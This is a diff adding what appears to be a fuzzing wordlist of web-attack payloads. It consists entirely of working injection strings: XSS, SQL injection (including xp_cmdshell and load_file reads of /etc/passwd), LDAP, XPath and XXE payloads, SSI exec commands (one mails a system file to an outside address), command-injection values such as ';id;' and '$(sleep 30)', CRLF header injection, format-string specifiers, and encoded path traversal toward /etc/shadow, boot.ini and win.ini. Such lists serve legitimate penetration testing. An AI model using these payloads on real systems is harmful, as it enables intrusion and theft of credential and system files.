@@ -1,0 +1,696 @@
+﻿>"><script>alert("XSS")</script>&
+>%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>
+'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'
+%s%p%x%d
+.1024d
+%.2049d
+%p%p%p%p
+%x%x%x%x
+%d%d%d%d
+%s%s%s%s
+%99999999999s
+%08x
+%%20d
+%%20n
+%%20x
+%%20s
+%s%s%s%s%s%s%s%s%s%s
+%p%p%p%p%p%p%p%p%p%p
+%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%
+%s x 129
+%x x 257
+-1
+0
+0x100
+0x1000
+0x3fffffff
+0x7ffffffe
+0x7fffffff
+0x80000000
+0xfffffffe
+0xffffffff
+0x10000
+0x100000
+'||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+||6
+'||'6
+(||6)
+' OR 1=1-- 
+OR 1=1
+' OR '1'='1
+; OR '1'='1'
+%22+or+isnull%281%2F0%29+%2F*
+%27+OR+%277659%27%3D%277659
+%22+or+isnull%281%2F0%29+%2F*
+%27+--+
+' or 1=1--
+" or 1=1--
+' or 1=1 /*
+or 1=1--
+' or 'a'='a
+" or "a"="a
+') or ('a'='a
+Admin' OR '
+'%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES--
+) UNION SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES;
+' having 1=1--
+' group by userid having 1=1--
+' SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = tablename')--
+' or 1 in (select @@version)--
+' union all select @@version--
+' OR 'unusual' = 'unusual'
+' OR 'something' = 'some'+'thing'
+' OR 'text' = N'text'
+' OR 'something' like 'some%'
+' OR 2 > 1
+' OR 'text' > 't'
+' OR 'whatever' in ('whatever')
+' OR 2 BETWEEN 1 and 3
+' or username like char(37);
+' union select * from users where login = char(114,111,111,116);
+' union select Password:*/=1--
+UNI/**/ON SEL/**/ECT
+'; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER'
+'; EXEC ('SEL' + 'ECT US' + 'ER')
+'/**/OR/**/1/**/=/**/1
+' or 1/*
++or+isnull%281%2F0%29+%2F*
+%27+OR+%277659%27%3D%277659
+%22+or+isnull%281%2F0%29+%2F*
+%27+--+&password=
+'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > @var select @var as var into temp end --
+' and 1 in (select var from temp)--
+' union select 1,load_file('/etc/passwd'),1,1,1;
+1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;
+' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));
+|
+!
+(
+)
+%28
+%29
+&
+%26
+%21
+%7C
+*|
+%2A%7C
+*(|(mail=*))
+%2A%28%7C%28mail%3D%2A%29%29
+*(|(objectclass=*))
+%2A%28%7C%28objectclass%3D%2A%29%29
+*()|%26'
+admin*
+admin*)((|userPassword=*)
+*)(uid=*))(|(uid=*
+'+or+'1'='1
+'+or+''='
+x'+or+1=1+or+'x'='y
+/
+//
+//*
+*/*
+@*
+count(/child::node())
+x'+or+name()='username'+or+'x'='y
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('gotcha');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foof>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xee;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xee;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xee;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xee;</foo>
+'sqlvuln
+'+sqlvuln
+sqlvuln;
+(sqlvuln)
+a' or 1=1--
+a" or 1=1--
+" or "a" = "a
+a' or 'a' = 'a
+1 or 1=1
+a' waitfor delay '0:0:20'--
+1 waitfor delay '0:0:20'--
+declare @q nvarchar (4000) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A;0;031003000270000;declare @s varchar(22) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s);declare @q nvarchar (4000) select @q = 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q);declare @s varchar (8000) select @s = 0x73656c65637420404076657273696f6e;exec(@s)
+a'
+?
+' or 1=1
+. or 1=1 --
+x' AND userid IS NULL; --
+x' AND email IS NULL; --
+anything' OR 'x'='x
+x' AND 1=(SELECT COUNT(*) FROM tabname); --
+x' AND members.email IS NULL; --
+x' OR full_name LIKE '%Bob%
+23 OR 1=1
+'; exec master..xp_cmdshell 'ping 172.10.1.255'--
+<!--#exec cmd="/bin/ls /" --><br/>
+<!--#exec cmd="cat /etc/passwd" --><br/>
+<!--#exec cmd="find / -name *.* -print" --><br/>
+<!--#exec cmd="mail sven.schlueter@contextis.de <mailto:sven.schlueter@contextis.de> < cat /etc/services" --><br/>
+\..\WINDOWS\win.ini
+\..\..\WINDOWS\win.ini
+\..\..\..\WINDOWS\win.ini
+\..\..\..\..\WINDOWS\win.ini
+\..\..\..\..\..\WINDOWS\win.ini
+\..\..\..\..\..\..\WINDOWS\win.ini
+%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69
+%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69
+%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69
+%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69
+%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69
+%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69
+%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69
+%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39
+%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39
+%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39
+%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39
+..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
+..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
+..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
+..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
+..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
+..%5c..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
+..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c
+%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c
+%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c
+../../../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../etc/passwd
+../../../../etc/passwd
+../../../etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34
+%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34
+%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34
+%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34
+../../../.htaccess
+../../.htaccess
+../.htaccess
+.htaccess
+././.htaccess
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%68%74%61%63%63%65%73%73
+%2e%2e%2f%2e%2e%2f%2e%68%74%61%63%63%65%73%73
+%2e%2e%2f%2e%68%74%61%63%63%65%73%73
+%2e%68%74%61%63%63%65%73%73
+%2e%2f%2e%2f%2e%68%74%61%63%63%65%73%73
+%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33
+%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33
+%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33
+%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33
+%%32%65%%32%66%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> 
+exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://127.0.0.1/xss.js></SCRIPT>'"-->
+<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
+[\xC0][\xBC]script>document.write("XSS-XSS-XSS");[\xC0][\xBC]/script>
+%s%p%x%d
+.1024d
+%.2049d
+%p%p%p%p
+%x%x%x%x
+%d%d%d%d
+%s%s%s%s
+%99999999999s
+%08x
+%%20d
+%%20n
+%%20x
+%%20s
+%s%s%s%s%s%s%s%s%s%s
+%p%p%p%p%p%p%p%p%p%p
+%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%
+f(x)=%s x 123
+f(x)=%x x 255
+%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s
+XXXXX.%p
+XXXXX`perl -e 'print ".%p" x 80'`
+`perl -e 'print ".%p" x 80'`%n
+%08x.%08x.%08x.%08x.%08x\n
+XXX0_%08x.%08x.%08x.%08x.%08x\n
+%.16705u%2\$hn
+\x10\x01\x48\x08_%08x.%08x.%08x.%08x.%08x|%s|
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;id > /tmp/file; exit;
+A
+TRUE
+FALSE
+0
+00
+1
+-1
+1.0
+-1.0
+2
+-2
+-20
+65536
+268435455
+-268435455
+2147483647
+0xfffffff
+NULL
+null
+\0
+\00
+%0a
+%00
++%00
+\0
+\0\0
+\0\0\0
+\00
+\00\00
+\00\00\00
+$null
+$NULL
+%
+#
+*
+}
+;
+/
+\
+\\
+\\/
+\\\\*
+\\\\?\\
+|
+`
+-
+--
+*|
+^'
+\'
+/'
+@'
+(')
+{'}
+[']
+*'
+#'
+!'
+!@#$%%^#$%#$@#$%$$@#$%^^**(()
+%01%02%03%04%0a%0d%0aADSF
+!@#0%^#0##018387@#0^^**(()
+%01%02%03%04%0a%0d%0aADSF
+\t
+"\t"
+&#10;
+&#13;
+&#10;&#13;
+&#13;&#10;
+#xD
+#xA
+#xD#xA
+#xA#xD
+/%00/
+%00/
+%00
+<?
+%3C%3F
+%60
+%5C
+%5C/
+%7C
+%00
+/%2A
+%2A
+%2C
+%20
+%20|
+%250a
+%2500
+../
+%2e%2e%2f
+..%u2215
+..%c0%af
+..%bg%qf
+..\
+..%5c
+..%%35c
+..%255c
+..%%35%63
+..%25%35%63
+..%u2216
+something%00html
+&apos;
+/&apos;
+\&apos;
+^&apos;
+@&apos;
+{&apos;}
+[&apos;]
+*&apos;
+#&apos;
+\"blah
+&quot;;id&quot;
+id%00
+id%00|
+<  script > < / script>
+">xxx<P>yyy
+"><script>"
+?x=
+?x="
+?x=|
+?x=>
+ABCD|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|
+/,%ENV,/
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+`id`
+;id;
+;read;
+;netstat -a;
+\nnetstat -a%\n
+|id|
+|id
+|ls
+|ls -la
+;ls -la
+|/bin/ls -al
+\n/bin/ls -al\n
+/index.html|id|
+`dir`
+|dir
+|dir|
+;dir
+%0d%0aX-Injection-Header:%20AttackValue
+/boot.ini
+/etc/passwd
+/etc/shadow
+C:/inetpub/wwwroot/global.asa
+C:\inetpub\wwwroot\global.asa
+C:/boot.ini
+C:\boot.ini
+../../../../../../../../../../../../etc/hosts%00
+../../../../../../../../../../../../etc/hosts
+../../boot.ini
+/../../../../../../../../%2A
+../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../etc/shadow%00
+../../../../../../../../../../../../etc/shadow
+/../../../../../../../../../../etc/passwd^^
+/../../../../../../../../../../etc/shadow^^
+/../../../../../../../../../../etc/passwd
+/../../../../../../../../../../etc/shadow
+/./././././././././././etc/passwd
+/./././././././././././etc/shadow
+\..\..\..\..\..\..\..\..\..\..\etc\passwd
+\..\..\..\..\..\..\..\..\..\..\etc\shadow
+..\..\..\..\..\..\..\..\..\..\etc\passwd
+..\..\..\..\..\..\..\..\..\..\etc\shadow
+/..\../..\../..\../..\../..\../..\../etc/passwd
+/..\../..\../..\../..\../..\../..\../etc/shadow
+.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd
+.\\./.\\./.\\./.\\./.\\./.\\./etc/shadow
+\..\..\..\..\..\..\..\..\..\..\etc\passwd%00
+\..\..\..\..\..\..\..\..\..\..\etc\shadow%00
+..\..\..\..\..\..\..\..\..\..\etc\passwd%00
+..\..\..\..\..\..\..\..\..\..\etc\shadow%00
+%0a/bin/cat%20/etc/passwd
+%0a/bin/cat%20/etc/shadow
+%00/etc/passwd%00
+%00/etc/shadow%00
+%00../../../../../../etc/passwd
+%00../../../../../../etc/shadow
+/../../../../../../../../../../../etc/passwd%00.jpg
+/../../../../../../../../../../../etc/passwd%00.html
+/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd
+/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
+/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%	25%5c..%25%5c..%00
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%		25%5c..%25%5c..%255cboot.ini
+/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini
+\\&apos;/bin/cat%20/etc/passwd\\&apos;
+\\&apos;/bin/cat%20/etc/shadow\\&apos;
+../../../../../../../../conf/server.xml
+/../../../../../../../../bin/id|
+../../../../../../../../../../../../localstart.asp%00
+../../../../../../../../../../../../localstart.asp
+../../../../../../../../../../../../boot.ini%00
+../../../../../../../../../../../../boot.ini
+/./././././././././././boot.ini
+/../../../../../../../../../../../boot.ini%00
+/../../../../../../../../../../../boot.ini
+/..\../..\../..\../..\../..\../..\../boot.ini
+/.\\./.\\./.\\./.\\./.\\./.\\./boot.ini
+\..\..\..\..\..\..\..\..\..\..\boot.ini
+..\..\..\..\..\..\..\..\..\..\boot.ini%00
+..\..\..\..\..\..\..\..\..\..\boot.ini
+/../../../../../../../../../../../boot.ini%00.html
+/../../../../../../../../../../../boot.ini%00.jpg
+/.../.../.../.../.../
+..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini
+<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+'
+"
+#
+-
+--
+' --
+--';
+' ;
+= '
+= ;
+= --
+\x23
+\x27
+\x3D \x3B'
+\x3D \x27
+\x27\x4F\x52 SELECT *
+\x27\x6F\x72 SELECT *
+'or select *
+admin'--
+<>"'%;)(&+
+' or ''='
+' or 'x'='x
+" or "x"="x
+') or ('x'='x
+0 or 1=1
+' or 0=0 --
+" or 0=0 --
+or 0=0 --
+' or 0=0 #
+" or 0=0 #
+or 0=0 #
+' or 1=1--
+" or 1=1--
+' or '1'='1'--
+"' or 1 --'"
+or 1=1--
+or%201=1
+or%201=1 --
+' or 1=1 or ''='
+" or 1=1 or ""="
+' or a=a--
+" or "a"="a
+') or ('a'='a
+") or ("a"="a
+hi" or "a"="a
+hi" or 1=1 --
+hi' or 1=1 --
+hi' or 'a'='a
+hi') or ('a'='a
+hi") or ("a"="a
+'hi' or 'x'='x';
+' or 1=1 or ''='
+' or ''='
+x' or 1=1 or 'x'='y
+@variable
+,@variable
+PRINT
+PRINT @@variable
+select
+insert
+as
+or
+procedure
+limit
+order by
+asc
+desc
+distinct
+having
+truncate
+replace
+like
+handler
+bfilename
+' or username like '%
+' or uname like '%
+' or userid like '%
+exec xp
+exec sp
+'; exec master..xp_cmdshell
+'; exec xp_regread
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+--sp_password
+\x27UNION SELECT
+' UNION SELECT
+' UNION ALL SELECT
+' or (EXISTS)
+' (select top 1
+'||UTL_HTTP.REQUEST
+1;SELECT%20*
+to_timestamp_tz
+tz_offset
+&lt;&gt;&quot;'%;)(&amp;+
+'%20or%201=1
+%27%20or%201=1
+%20$(sleep%2050)
+%20'sleep%2050'
+char%4039%41%2b%40SELECT
+&apos;%20OR
+'sqlattempt1
+(sqlattempt2)
+|
+%7C
+*|
+%2A%7C
+*(|(mail=*))
+%2A%28%7C%28mail%3D%2A%29%29
+*(|(objectclass=*))
+%2A%28%7C%28objectclass%3D%2A%29%29
+(
+%28
+)
+%29
+&
+%26
+!
+%21
+/
+//
+//*
+*/*
+@*
+x' or name()='username' or 'x'='y
+count(/child::node())
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
+<name>','')); phpinfo(); exit;/*</name>
+<>\/*%;()&^{“£$+=[]@~?:¬`|-£'
+<>\/*%;()&^{“£$+=[]@~?:¬`|-£'#
+<>\/*%;()&^{“£$+=[]@~?:¬`|-£'?
+#
+%
+*
+//
+/*
+'%
+'*
+'//
+'/*
+"%
+"*
+"//
+"/*
+']%
+']*
+']//
+']/*
+')%
+')*
+')//
+')/*
+"]%
+"]*
+"]//
+"]/*
+")%
+")*
+")//
+")/*
+ or 1=1--
+' or '1'='1
+" or "1"="1
+') or ('1'='1
+ or 1=1--
+' or '1'='1-
+ AND 8303=8303
+' AND 'uueZT'='uueZT  
+' AND 'uueZT'='uueZT 
+' AND 'uueZT' LIKE 'uueZT 
+" AND "uueZT"="uueZT 
+" AND "uueZT" LIKE "uueZT 
+) AND (6035=6035 
+') AND ('tZlRD'='tZlRD 
+') AND ('tZlRD' LIKE 'tZlRD 
+") AND ("tZlRD"="tZlRD 
+") AND ("tZlRD" LIKE "tZlRD
+  OR 8303=8303
+' OR 'uueZT'='uueZT  
+' OR 'uueZT'='uueZT 
+' OR 'uueZT' LIKE 'uueZT 
+" OR "uueZT"="uueZT 
+" OR "uueZT" LIKE "uueZT 
+) OR (6035=6035 
+') OR ('tZlRD'='tZlRD 
+') OR ('tZlRD' LIKE 'tZlRD 
+") OR ("tZlRD"="tZlRD 
+") OR ("tZlRD" LIKE "tZlRD
+  OR 8303=8303--
+' OR 'uueZT'='uueZT'--
+' OR 'uueZT'='uueZT'--
+' OR 'uueZT' LIKE 'uueZT'--
+" OR "uueZT"="uueZT"--
+" OR "uueZT" LIKE "uueZT"--
+) OR (6035=6035)--
+') OR ('tZlRD'='tZlRD')-- 
+') OR ('tZlRD' LIKE 'tZlRD')-- 
+") OR ("tZlRD"="tZlRD")--
+") OR ("tZlRD" LIKE "tZlRD")--
+--
+'--
+ 1==1
+'1==1'
+%25%25
+%2525
+'
+"
+']
+"]
+*//
+//*
+%@|><&dir;
+dir
+`dir` 
+$(dir)
+; dir
+| dir
+&& dir
+|| dir
+sleep
+`sleep 30` 
+$(sleep 30)
+; sleep 30
+| sleep 30
+&& sleep 30
+|| sleep 30
+Response.write("COOOOOOOOOOOOOOOOONTEXT")
+& Response.write("COOOOOOOOOOOOOOOOONTEXT")
+'& Response.write("COOOOOOOOOOOOOOOOONTEXT")
+' Response.write("COOOOOOOOOOOOOOOOONTEXT")
+%0d%0aResponse.write("COOOOOOOOOOOOOOOOONTEXT")
+%0d%0a'Response.write("COOOOOOOOOOOOOOOOONTEXT")
+'%0d%0aResponse.write("COOOOOOOOOOOOOOOOONTEXT")
